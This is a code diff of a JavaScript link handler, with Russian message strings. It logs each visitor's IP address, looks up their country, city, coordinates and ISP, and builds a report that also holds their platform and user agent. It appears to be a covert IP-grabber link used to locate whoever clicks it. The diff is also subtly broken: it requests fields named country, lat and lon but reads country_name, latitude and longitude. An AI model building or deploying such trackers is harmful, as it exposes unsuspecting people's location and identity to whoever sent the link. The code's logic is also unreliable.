@@ -5,18 +5,26 @@ export default async function handler(req, res) {
   
   let geo = {};
   try {
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city,lat,lon,org`);
     geo = await geoRes.json();
-  } catch (_) {}
+  } catch (_) {
+    geo = {
+      country_name: "Не удалось получить данные",
+      city: "Не удалось получить данные",
+      latitude: "Не удалось получить данные",
+      longitude: "Не удалось получить данные",
+      org: "Не удалось получить данные"
+    };
+  }
 
   const message = `
 🔗 Ссылка: ${slug}
 🌍 IP: \`${ip}\`
-📍 Страна: ${geo.country_name || "?"}
-🏙️ Город: ${geo.city || "?"}
-🧭 Координаты: ${geo.latitude || "?"}, ${geo.longitude || "?"}
-🌐 Провайдер: ${geo.org || "?"}
-🕰️ Локальное время: \`${geo.utc_offset || "?"}\`
+📍 Страна: \`${geo.country_name || "?"}\`
+🏙️ Город: \`${geo.city || "?"}\`
+🧭 Координаты: \`${geo.latitude || "?"}\`, \`${geo.longitude || "?"}\`
+🌐 Провайдер: \`${geo.org || "?"}\`
+🕰️ Локальное время: \`${new Date().toLocaleString()}\`
 💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
 🧾 UA: \`${ua}\`
   `.trim();
